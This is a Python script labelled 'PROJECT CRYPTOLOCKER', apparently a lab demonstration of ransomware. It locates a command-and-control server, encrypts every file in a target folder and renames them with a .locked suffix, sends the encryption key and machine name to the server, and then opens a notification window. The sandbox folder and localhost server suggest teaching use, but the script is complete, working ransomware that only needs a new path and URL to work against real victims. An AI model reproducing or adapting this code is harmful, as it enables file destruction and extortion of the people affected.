import os
import socket
import requests
from cryptography.fernet import Fernet

# Import the standalone user interface component from your separate file
try:
    from notification_window import show_alert_window
except ImportError:
    # Fallback definition if notification_window.py is in the same directory
    import sys
    sys.path.append(os.path.dirname(os.path.abspath(__file__)))
    from notification_window import show_alert_window

# ==========================================
# ⚠️ SAFETY CONFIGURATION
# ==========================================
DESKTOP_PATH = os.path.join(os.path.expanduser("~"), "Desktop")
TARGET_DIRECTORY = os.path.join(DESKTOP_PATH, "DUMMY_TARGET")

def resolve_c2_url():
    """Checks local web server configurations to dynamically find the correct C2 URL."""
    local_endpoints = [
        "http://localhost/c2_server/get_config.php",
        "http://localhost:8080/c2_server/get_config.php"
    ]
    
    for endpoint in local_endpoints:
        try:
            response = requests.get(endpoint, timeout=2)
            if response.status_code == 200:
                config_data = response.json()
                return config_data.get("c2_url")
        except Exception:
            continue
            
    return "http://localhost/c2_server/receive.php"

# Dynamically set the URL based on which machine is running the code
C2_SERVER_URL = resolve_c2_url()
# ==========================================

def generate_key():
    """Generates a secure AES-128 key."""
    return Fernet.generate_key()

def check_server_availability():
    """
    Step 2: Pre-flight check. Pings the C2 server to verify XAMPP is running.
    Returns True if available, False otherwise.
    """
    try:
        # Send a quick GET request to check if the server path is responsive
        response = requests.get(C2_SERVER_URL, timeout=3)
        # Our custom script returns a 404 for GET requests, which means the server IS alive!
        # Standard connection success (200) or our hidden response (404) means the port is open.
        if response.status_code in [200, 404]:
            print("[+] SERVER CHECK: C2 Server (XAMPP) is online and responsive.")
            return True
    except requests.exceptions.RequestException:
        pass
    
    print(f"[-] SERVER CHECK ERROR: C2 Server at {C2_SERVER_URL} is unreachable!")
    print("[-] Aborting routine to prevent permanent data loss. Please start XAMPP.")
    return False

def encrypt_files(key):
    """Step 3: Scans the target folder and encrypts unencrypted data."""
    if not os.path.exists(TARGET_DIRECTORY):
        print(f"[-] ERROR: Sandbox directory not found at {TARGET_DIRECTORY}")
        return False

    print(f"[*] Scanning target folder: {TARGET_DIRECTORY}")
    fernet = Fernet(key)
    encrypted_any = False
    
    for root, dirs, files in os.walk(TARGET_DIRECTORY):
        for file in files:
            file_path = os.path.join(root, file)
            
            # If already encrypted, do absolutely nothing
            if file_path.endswith(".locked"):
                print(f"  [.] Already Encrypted (No action): {file}")
                continue
                
            try:
                with open(file_path, "rb") as f:
                    original_data = f.read()
                
                encrypted_data = fernet.encrypt(original_data)
                
                with open(file_path, "wb") as f:
                    f.write(encrypted_data)
                
                os.rename(file_path, file_path + ".locked")
                print(f"  [+] Encrypted successfully: {file}")
                encrypted_any = True
                
            except Exception as e:
                print(f"  [-] Skipped {file}: Access Denied")

    return encrypted_any

def exfiltrate_key(key):
    """Step 4: Transmits the key to the server after successful encryption."""
    machine_name = socket.gethostname()
    data = {
        "pc_name": machine_name,
        "key": key.decode('utf-8')
    }
    
    try:
        response = requests.post(C2_SERVER_URL, data=data, timeout=5)
        if "Exfiltration Successful" in response.text:
            print("[+] TRANSMISSION SUCCESS: Key logged securely in the database.")
        else:
            print(f"[-] TRANSMISSION ERROR: Server rejected the key. Response: {response.text}")
    except Exception as e:
        print("[-] TRANSMISSION FATAL ERROR: Lost connection to server during exfiltration.")

if __name__ == "__main__":
    print("====================================")
    print(" PROJECT CRYPTOLOCKER - PAYLOAD EXEC")
    print("====================================\n")
    
    # Sequence Step 1: Generate the local cryptographic key
    my_aes_key = generate_key()
    print("[*] Sequence Step 1: Generated local cryptographic key.")
    
    # Sequence Step 2: Check server availability before doing any damage
    if check_server_availability():
        
        # Sequence Step 3: Scan, verify files, and execute encryption
        print("\n[*] Sequence Step 3: Initiating filesystem modification routine...")
        files_were_locked = encrypt_files(my_aes_key)
        
        # Sequence Step 4: Exfiltrate key only if files were newly encrypted
        if files_were_locked:
            print("\n[*] Sequence Step 4: Forwarding encryption token to core infrastructure...")
            exfiltrate_key(my_aes_key)
            
            # Sequence Step 5: Launch external notification window module
            print("[*] Sequence Step 5: Launching modular notification window...")
            show_alert_window()
        else:
            print("\n[*] Sequence Step 4: No modifications required. Transmission routine bypassed.")
            
    print("\n[+] Execution sequence complete.")